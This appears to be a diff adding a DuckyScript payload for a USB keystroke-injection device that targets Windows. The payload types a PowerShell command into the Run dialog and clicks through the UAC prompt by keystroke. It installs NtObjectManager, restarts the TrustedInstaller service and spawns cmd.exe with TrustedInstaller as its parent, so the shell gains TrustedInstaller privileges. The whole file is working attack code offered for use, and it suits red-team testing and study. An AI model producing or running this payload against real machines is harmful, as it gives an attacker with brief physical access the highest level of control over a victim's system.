@@ -1,0 +1,61 @@
+REM TITLE : Execute commands as 'NT AUTHORITY\SYSTEM' with 'TrustedInstaller' privileges
+REM AUTHOR : TW-D
+REM DESCRIPTION :
+REM - Launch a new cmd.exe process with elevated privileges under TrustedInstaller,
+REM - by setting the TrustedInstaller process as the parent, the cmd.exe process inherits TrustedInstaller's privileges.
+REM TARGET : Microsoft Windows
+REM VERSION : 1.0
+REM CATEGORY : Execution
+
+DUCKY_LANG US
+DELAY 2000
+
+REM ---
+REM TrustedInstaller initial command.
+REM ---
+DEFINE #TRUSTEDINSTALLER_COMMAND WHOAMI /ALL
+
+CAPSLOCK_DISABLE
+
+GUI r
+DELAY 2000
+STRING powershell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Unrestricted
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 2000
+STRINGLN_BLOCK
+If (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $MODULE_NAME = "NtObjectManager"
+    $MODULE_VERSION = "1.1.32"
+    $NtObjectManager = Get-InstalledModule -Name $MODULE_NAME -ErrorAction SilentlyContinue
+    If ($NtObjectManager -eq $null) {
+        Try {
+            Install-Module -Name $MODULE_NAME -RequiredVersion $MODULE_VERSION -Force
+        } Catch {
+            Write-Error "$_"
+        }
+    }
+    Try {
+        Import-Module NtObjectManager -Force
+    } Catch {
+        Write-Error "$_"
+    }
+    Try {
+        $TrustedInstaller = Get-Service -Name "TrustedInstaller" -ErrorAction SilentlyContinue
+        If ($TrustedInstaller) {
+            C:\Windows\System32\sc.exe stop TrustedInstaller | Out-Null
+        }
+        C:\Windows\System32\sc.exe config TrustedInstaller binPath= "C:\Windows\servicing\TrustedInstaller.exe" | Out-Null
+        C:\Windows\System32\sc.exe start TrustedInstaller | Out-Null
+        $TrustedInstaller = Get-NtProcess "TrustedInstaller.exe" -ErrorAction Stop
+        New-Win32Process -CommandLine "C:\Windows\System32\cmd.exe /K #TRUSTEDINSTALLER_COMMAND" -CreationFlags NewConsole -ParentProcess $TrustedInstaller | Out-Null
+    } Catch {
+        Write-Error "$_"
+    }
+}
+END_STRINGLN
+ENTER
